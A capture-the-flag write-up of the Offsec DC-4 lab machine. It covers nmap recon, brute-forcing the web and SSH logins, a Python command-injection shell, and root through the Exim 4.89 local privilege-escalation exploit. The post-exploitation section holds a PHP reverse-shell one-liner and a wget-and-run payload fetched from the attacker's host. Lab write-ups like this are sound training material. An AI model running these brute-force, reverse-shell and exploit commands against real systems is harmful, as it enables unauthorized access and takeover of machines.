---
layout: post
title: "[Offsec] DC-4 writeup"
categories: ctf offsec oscp
---

## Introduction

The challenge can be found at: [Offsec Labs Play](https://portal.offsec.com/labs/play)

![offsec](/assets/images/dc4/offsec.png)

## Recon

We start with an nmap scan:

```
> sudo nmap -v -AO -sC 192.168.188.195 -p-
[sudo] password for rzy:
Starting Nmap 7.95 ( https://nmap.org ) at 2024-06-21 23:14 CDT
NSE: Loaded 157 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 23:14
Completed NSE at 23:14, 0.00s elapsed
Initiating NSE at 23:14
Completed NSE at 23:14, 0.00s elapsed
Initiating NSE at 23:14
Completed NSE at 23:14, 0.00s elapsed
Initiating Ping Scan at 23:14
Scanning 192.168.188.195 [4 ports]
Completed Ping Scan at 23:14, 0.08s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 23:14
Completed Parallel DNS resolution of 1 host. at 23:14, 0.00s elapsed
Initiating SYN Stealth Scan at 23:14
Scanning 192.168.188.195 [65535 ports]
Discovered open port 80/tcp on 192.168.188.195
Discovered open port 22/tcp on 192.168.188.195
Completed SYN Stealth Scan at 23:15, 41.83s elapsed (65535 total ports)
Initiating Service scan at 23:15
Scanning 2 services on 192.168.188.195
Completed Service scan at 23:15, 6.11s elapsed (2 services on 1 host)
Initiating OS detection (try #1) against 192.168.188.195
Retrying OS detection (try #2) against 192.168.188.195
Retrying OS detection (try #3) against 192.168.188.195
Retrying OS detection (try #4) against 192.168.188.195
Retrying OS detection (try #5) against 192.168.188.195
Initiating Traceroute at 23:15
Completed Traceroute at 23:15, 0.05s elapsed
Initiating Parallel DNS resolution of 4 hosts. at 23:15
Completed Parallel DNS resolution of 4 hosts. at 23:15, 0.00s elapsed
NSE: Script scanning 192.168.188.195.
Initiating NSE at 23:15
Completed NSE at 23:15, 1.64s elapsed
Initiating NSE at 23:15
Completed NSE at 23:15, 0.19s elapsed
Initiating NSE at 23:15
Completed NSE at 23:15, 0.00s elapsed
Nmap scan report for 192.168.188.195
Host is up (0.044s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey:
|   2048 8d:60:57:06:6c:27:e0:2f:76:2c:e6:42:c0:01:ba:25 (RSA)
|   256 e7:83:8c:d7:bb:84:f3:2e:e8:a2:5f:79:6f:8e:19:30 (ECDSA)
|_  256 fd:39:47:8a:5e:58:33:99:73:73:9e:22:7f:90:4f:4b (ED25519)
80/tcp open  http    nginx 1.15.10
|_http-title: System Tools
| http-methods:
|_  Supported Methods: GET HEAD POST
|_http-server-header: nginx/1.15.10
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.95%E=4%D=6/21%OT=22%CT=1%CU=39639%PV=Y%DS=4%DC=T%G=Y%TM=66764FF
OS:5%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=10D%TI=Z%II=I%TS=8)SEQ(SP=1
OS:05%GCD=1%ISR=10A%TI=Z%II=I%TS=8)SEQ(SP=10A%GCD=1%ISR=109%TI=Z%II=I%TS=8)
OS:SEQ(SP=FC%GCD=1%ISR=100%TI=Z%II=I%TS=8)SEQ(SP=FD%GCD=1%ISR=10E%TI=Z%II=I
OS:%TS=8)OPS(O1=M551ST11NW7%O2=M551ST11NW7%O3=M551NNT11NW7%O4=M551ST11NW7%O
OS:5=M551ST11NW7%O6=M551ST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6
OS:=7120)ECN(R=Y%DF=Y%T=40%W=7210%O=M551NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O
OS:%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=N)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=
OS:AR%O=%RD=0%Q=)T6(R=N)T7(R=N)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%R
OS:IPCK=G%RUCK=BC76%RUD=G)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=
OS:G%RUCK=BD76%RUD=G)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUC
OS:K=BE76%RUD=G)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=BF7
OS:6%RUD=G)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=C076%RUD
OS:=G)IE(R=Y%DFI=N%T=40%CD=S)

Uptime guess: 0.060 days (since Fri Jun 21 21:48:51 2024)
Network Distance: 4 hops
TCP Sequence Prediction: Difficulty=252 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 3389/tcp)
HOP RTT      ADDRESS
1   40.43 ms 192.168.45.1
2   40.41 ms 192.168.45.254
3   41.84 ms 192.168.251.1
4   41.89 ms 192.168.188.195

NSE: Script Post-scanning.
Initiating NSE at 23:15
Completed NSE at 23:15, 0.00s elapsed
Initiating NSE at 23:15
Completed NSE at 23:15, 0.00s elapsed
Initiating NSE at 23:15
Completed NSE at 23:15, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 62.36 seconds
           Raw packets sent: 65841 (2.902MB) | Rcvd: 65692 (2.631MB)

```

We can see they have 2 services: SSH and HTTP Web Server. SSH 7.4p1 is fairly outdated, but let's take a look at the web service first.

![web](/assets/images/dc4/web.png)

We can try some basic combinations: `root:root`, `admin:admin`, `admin:root`, etc. At this point, we have too little information to bruteforce. Let's take a look at the SSH service.

```
> searchsploit ssh 7.4p1
-------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                        |  Path
-------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
OpenSSH 2.3 < 7.7 - Username Enumeration                                                                                              | linux/remote/45233.py
OpenSSH 2.3 < 7.7 - Username Enumeration (PoC)                                                                                        | linux/remote/45210.py
OpenSSH < 7.4 - 'UsePrivilegeSeparation Disabled' Forwarded Unix Domain Sockets Privilege Escalation                                  | linux/local/40962.txt
OpenSSH < 7.4 - agent Protocol Arbitrary Library Loading                                                                              | linux/remote/40963.txt
OpenSSH < 7.7 - User Enumeration (2)                                                                                                  | linux/remote/45939.py
-------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

Let's try to enumerate users from ssh, and that could give more clue! Let's use [CVE-2018-15473](https://github.com/l4rzy/CVE-2018-15473-Exploit) exploitation code.

```
> python sshUsernameEnumExploit.py 192.168.188.195 --userList /usr/share/wordlists/usernames/top-usernames-shortlist.txt
Target host most probably is not vulnerable or already patched, exiting...
```

Let's go back to the web service and try some SQL Injections.

```
> sqlmap --method POST --data="username=a&password=b" -u http://192.168.188.195/login.php --random-agent
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.8.6.3#dev}
|_ -| . [(]     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 23:33:41 /2024-06-24/

[23:33:41] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.8) Gecko/20100804 Gentoo Firefox/3.6.8' from file '/opt/sqlmap/data/txt/user-agents.txt'
[23:33:41] [INFO] testing connection to the target URL
got a 302 redirect to 'http://192.168.188.195/index.php'. Do you want to follow? [Y/n] n
you have not declared cookie(s), while server wants to set its own ('PHPSESSID=5nabv929oqv...dgik0clk06'). Do you want to use those [Y/n] y
[23:33:45] [INFO] checking if the target is protected by some kind of WAF/IPS
[23:33:45] [INFO] testing if the target URL content is stable
[23:33:45] [WARNING] POST parameter 'username' does not appear to be dynamic
[23:33:45] [WARNING] heuristic (basic) test shows that POST parameter 'username' might not be injectable
[23:33:45] [INFO] testing for SQL injection on POST parameter 'username'
[23:33:45] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[23:33:46] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[23:33:46] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[23:33:46] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[23:33:46] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[23:33:47] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[23:33:47] [INFO] testing 'Generic inline queries'
[23:33:47] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[23:33:47] [WARNING] time-based comparison requires larger statistical model, please wait. (done)                                                                      
[23:33:47] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[23:33:48] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[23:33:48] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[23:33:48] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
[23:33:48] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
[23:33:49] [INFO] testing 'Oracle AND time-based blind'
it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] 

[23:33:51] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[23:33:52] [WARNING] POST parameter 'username' does not seem to be injectable
[23:33:52] [WARNING] POST parameter 'password' does not appear to be dynamic
[23:33:52] [WARNING] heuristic (basic) test shows that POST parameter 'password' might not be injectable
[23:33:52] [INFO] testing for SQL injection on POST parameter 'password'
[23:33:52] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[23:33:53] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[23:33:53] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[23:33:53] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[23:33:53] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[23:33:54] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[23:33:54] [INFO] testing 'Generic inline queries'
[23:33:54] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[23:33:54] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[23:33:54] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[23:33:55] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[23:33:55] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
[23:33:55] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
[23:33:56] [INFO] testing 'Oracle AND time-based blind'
[23:33:56] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[23:33:57] [WARNING] POST parameter 'password' does not seem to be injectable
[23:33:57] [CRITICAL] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment')
```
That means the only viable option now is bruteforcing the login page. Because the title of the page is `Admin Information Systems Login`, let's try with username `admin`.

```
> ffuf -X POST -w /usr/share/wordlists/passwords/rockyou-75.txt -raw -d "username=admin&password=FUZZ" -H "Content-Type: application/x-www-form-urlencoded" -u http://192.168.188.195/login.php -fs 206

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://192.168.188.195/login.php
 :: Wordlist         : FUZZ: /usr/share/wordlists/passwords/rockyou-75.txt
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Data             : username=admin&password=FUZZ
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 206
________________________________________________

happy                   [Status: 302, Size: 367, Words: 16, Lines: 16, Duration: 48ms]
```

That was easy. After logging in, we have a simple admin portal that allows us to execute 3 commands.

![admin](/assets/images/dc4/admin.png)

![cmd](/assets/images/dc4/cmd.png)

After inspecting the POST request, we know we can execute any command. Let's write a simple script to create a shell.

```py
import requests
import readline

headers = {
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:127.0) Gecko/20100101 Firefox/127.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Origin': 'http://192.168.188.195',
    'Connection': 'keep-alive',
    'Referer': 'http://192.168.188.195/command.php',
    'Cookie': 'PHPSESSID=6orbico54kasefb4n8fmvsvp71',
    'Upgrade-Insecure-Requests': '1',
    'Priority': 'u=1',
    'Pragma': 'no-cache',
    'Cache-Control': 'no-cache',
}

while True:
    cmd = input("fake shell> ")
    response = requests.post(f"http://192.168.188.195/command.php", headers=headers, data={'radio': cmd, 'submit': 'Run'}, verify=False)
    start = response.text.find("<br /><pre>")
    end = response.text.find("</pre><p><a href='login.php'>Return to the menu")
    print(response.text[start+len("<br /><pre>"):end])
```

```
fake shell> id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

fake shell> find /usr -type f -perm /4000
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/newgrp
/usr/bin/passwd
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/sbin/exim4

fake shell> systemctl status exim4
● exim4.service - LSB: exim Mail Transport Agent
   Loaded: loaded (/etc/init.d/exim4; generated; vendor preset: enabled)
   Active: active (running) since Mon 2023-01-23 19:31:53 AEST; 1 years 5 months ago
     Docs: man:systemd-sysv-generator(8)
  Process: 538 ExecStart=/etc/init.d/exim4 start (code=exited, status=0/SUCCESS)
    Tasks: 1 (limit: 4915)
   CGroup: /system.slice/exim4.service
           └─810 /usr/sbin/exim4 -bd -q30m

fake shell> ls -lah /home
total 20K
drwxr-xr-x  5 root    root    4.0K Apr  7  2019 .
drwxr-xr-x 21 root    root    4.0K Apr  5  2019 ..
drwxr-xr-x  2 charles charles 4.0K Apr  7  2019 charles
drwxr-xr-x  3 jim     jim     4.0K Jun 25 10:45 jim
drwxr-xr-x  2 sam     sam     4.0K Apr  7  2019 sam

fake shell> cat /proc/version
Linux version 4.9.0-3-686 (debian-kernel@lists.debian.org) (gcc version 6.3.0 20170516 (Debian 6.3.0-18) ) #1 SMP Debian 4.9.30-2+deb9u5 (2017-09-19)
```

At this point we can take a look around and see what's inside the system to do privilege escalation, but I noticed we got something interesting in the home folders. So let's dive into the users' home folders.

```
fake shell> ls -lah /home/jim/
total 40K
drwxr-xr-x 3 jim  jim  4.0K Jun 25 10:45 .
drwxr-xr-x 5 root root 4.0K Apr  7  2019 ..
-rw-r--r-- 1 jim  jim   220 Apr  6  2019 .bash_logout
-rw-r--r-- 1 jim  jim  3.5K Apr  6  2019 .bashrc
-rw-r--r-- 1 jim  jim   675 Apr  6  2019 .profile
drwxr-xr-x 2 jim  jim  4.0K Apr  7  2019 backups
-rwxr-xr-x 1 jim  jim  2.2K Jun 25 10:45 exploit.sh
-rw-r--r-- 1 root root   33 Jun 25 09:19 local.txt
-rw------- 1 jim  jim   528 Apr  6  2019 mbox
-rwsrwxrwx 1 jim  jim   174 Apr  6  2019 test.sh

fake shell> ls -lah /home/jim/backups
total 12K
drwxr-xr-x 2 jim jim 4.0K Apr  7  2019 .
drwxr-xr-x 3 jim jim 4.0K Jun 25 10:45 ..
-rw-r--r-- 1 jim jim 2.0K Apr  7  2019 old-passwords.bak

fake shell> head -10 /home/jim/backups/old-passwords.bak
000000
12345
iloveyou
1q2w3e4r5t
1234
123456a
qwertyuiop
monkey
123321
dragon
```

Maybe it's a good idea to bruteforce jim's account using his password file.

```
> hydra -t 40 -l jim -P pass.txt 192.168.188.195 ssh -v -I
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-06-25 02:35:21
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (ignored ...) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 40 tasks per 1 server, overall 40 tasks, 253 login tries (l:1/p:253), ~7 tries per task
[DATA] attacking ssh://192.168.188.195:22/
[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
[INFO] Testing if password authentication is supported by ssh://jim@192.168.188.195:22
[INFO] Successful, password authentication is supported by ssh://192.168.188.195:22
[ERROR] could not connect to target port 22: Socket error: Connection reset by peer
[ERROR] could not connect to target port 22: Socket error: Connection reset by peer
[ERROR] ssh protocol error
[ERROR] ssh protocol error
[VERBOSE] Disabled child 5 because of too many errors
[VERBOSE] Disabled child 18 because of too many errors
[ERROR] could not connect to target port 22: Socket error: Connection reset by peer
[ERROR] could not connect to target port 22: Socket error: Connection reset by peer
[ERROR] ssh protocol error
[ERROR] ssh protocol error
[ERROR] could not connect to target port 22: Socket error: Connection reset by peer
[ERROR] ssh protocol error
[ERROR] could not connect to target port 22: Socket error: Connection reset by peer
[ERROR] ssh protocol error
[VERBOSE] Disabled child 21 because of too many errors
[VERBOSE] Disabled child 25 because of too many errors
[VERBOSE] Disabled child 26 because of too many errors
[VERBOSE] Disabled child 29 because of too many errors
[ERROR] could not connect to target port 22: Socket error: Connection reset by peer
[ERROR] ssh protocol error
[VERBOSE] Disabled child 39 because of too many errors
[ERROR] could not connect to target port 22: Socket error: Connection reset by peer
[ERROR] ssh protocol error
[ERROR] could not connect to target port 22: Socket error: Connection reset by peer
[ERROR] could not connect to target port 22: Socket error: Connection reset by peer
[ERROR] ssh protocol error
[ERROR] ssh protocol error
[VERBOSE] Disabled child 34 because of too many errors
[VERBOSE] Disabled child 36 because of too many errors
[VERBOSE] Disabled child 38 because of too many errors
[ERROR] could not connect to target port 22: Socket error: disconnected
[ERROR] could not connect to target port 22: Socket error: Connection reset by peer
[ERROR] ssh protocol error
[ERROR] ssh protocol error
[VERBOSE] Retrying connection for child 4
[VERBOSE] Retrying connection for child 22
[ERROR] could not connect to target port 22: Socket error: Connection reset by peer
[ERROR] ssh protocol error
[VERBOSE] Retrying connection for child 3
[ERROR] could not connect to target port 22: Socket error: Connection reset by peer
[ERROR] ssh protocol error
[VERBOSE] Retrying connection for child 16
[ERROR] could not connect to target port 22: Socket error: Connection reset by peer
[ERROR] ssh protocol error
[VERBOSE] Retrying connection for child 14
[ERROR] could not connect to target port 22: Socket error: Connection reset by peer
[ERROR] ssh protocol error
[VERBOSE] Retrying connection for child 33
[ERROR] could not connect to target port 22: Socket error: Connection reset by peer
[ERROR] ssh protocol error
[VERBOSE] Disabled child 35 because of too many errors
[ERROR] could not connect to target port 22: Socket error: Connection reset by peer
[ERROR] could not connect to target port 22: Socket error: Connection reset by peer
[ERROR] ssh protocol error
[ERROR] ssh protocol error
[VERBOSE] Disabled child 24 because of too many errors
[VERBOSE] Disabled child 27 because of too many errors
[ERROR] could not connect to target port 22: Socket error: Connection reset by peer
[ERROR] ssh protocol error
[VERBOSE] Disabled child 16 because of too many errors
[ERROR] could not connect to target port 22: Socket error: Connection reset by peer
[ERROR] ssh protocol error
[VERBOSE] Disabled child 14 because of too many errors
[22][ssh] host: 192.168.188.195   login: jim   password: jibril04
[STATUS] attack finished for 192.168.188.195 (waiting for children to complete tests)
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 15 final worker threads did not complete until end.
[ERROR] 15 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
```

Sweet! We got what we needed. Let's login

```
> ssh jim@192.168.188.195
jim@192.168.188.195's password: 
Linux dc-4 4.9.0-3-686 #1 SMP Debian 4.9.30-2+deb9u5 (2017-09-19) i686

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
You have mail.
Last login: Tue Jun 25 10:39:26 2024 from 192.168.45.159
jim@dc-4:~$ id 
uid=1002(jim) gid=1002(jim) groups=1002(jim)
jim@dc-4:~$ cat mbox 
From root@dc-4 Sat Apr 06 20:20:04 2019
Return-path: <root@dc-4>
Envelope-to: jim@dc-4
Delivery-date: Sat, 06 Apr 2019 20:20:04 +1000
Received: from root by dc-4 with local (Exim 4.89)
        (envelope-from <root@dc-4>)
        id 1hCiQe-0000gc-EC
        for jim@dc-4; Sat, 06 Apr 2019 20:20:04 +1000
To: jim@dc-4
Subject: Test
MIME-Version: 1.0
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: 8bit
Message-Id: <E1hCiQe-0000gc-EC@dc-4>
From: root <root@dc-4>
Date: Sat, 06 Apr 2019 20:20:04 +1000
Status: RO

This is a test.

```
## Climbing up
Taking a look at `exim4`, we know that it's a mailing service. Version 4.89 of it is also susceptible to [priviledge escalation](https://www.exploit-db.com/exploits/46996)

And after running the exploitation script:
```
jim@dc-4:~$ ./exploit.sh 

raptor_exim_wiz - "The Return of the WIZard" LPE exploit
Copyright (c) 2019 Marco Ivaldi <raptor@0xdeadbeef.info>

Preparing setuid shell helper...
Problems compiling setuid shell helper, check your gcc.
Falling back to the /bin/sh method.
cp: cannot create regular file '/tmp/pwned': Permission denied

Delivering setuid payload...
220 dc-4 ESMTP Exim 4.89 Tue, 25 Jun 2024 18:06:55 +1000
250 dc-4 Hello localhost.offseclabs.com [::1]
250 OK
250 Accepted
354 Enter message, ending with "." on a line by itself
250 OK id=1sM1CZ-0000oW-B1
221 dc-4 closing connection

Waiting 5 seconds...
-rwsr-xr-x 1 root jim 7500 Jun 25 10:46 /tmp/pwned
# id
uid=0(root) gid=0(root) groups=0(root),1002(jim)
# 
```

## Post exploitation

At this point, I'm wondering if we can escalate to root just from `www-data`. If it is possible, we can save ourselves one step from brutforcing `jim`'s password. 

```
fake shell> php -r '$sock=fsockopen("192.168.45.159",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
```

```
# on reverse shell
$ cd /tmp
$ wget http://192.168.45.159:9090/exim4.sh
$ chmod +x exim4.sh
$ ./exim4.sh

raptor_exim_wiz - "The Return of the WIZard" LPE exploit
Copyright (c) 2019 Marco Ivaldi <raptor@0xdeadbeef.info>

Preparing setuid shell helper...
./exim4.sh: line 113: /tmp/pwned.c: Permission denied
Problems compiling setuid shell helper, check your gcc.
Falling back to the /bin/sh method.
cp: cannot create regular file '/tmp/pwned': Permission denied

Delivering setuid payload...
220 dc-4 ESMTP Exim 4.89 Tue, 25 Jun 2024 18:42:00 +1000
250 dc-4 Hello localhost [::1]
250 OK
250 Accepted
354 Enter message, ending with "." on a line by itself
250 OK id=1sM1kW-0000rT-6B
221 dc-4 closing connection

Waiting 5 seconds...
-rwsr-xr-x 1 root jim 7500 Jun 25 10:46 /tmp/pwned
id
uid=0(root) gid=0(root) groups=0(root),33(www-data)
```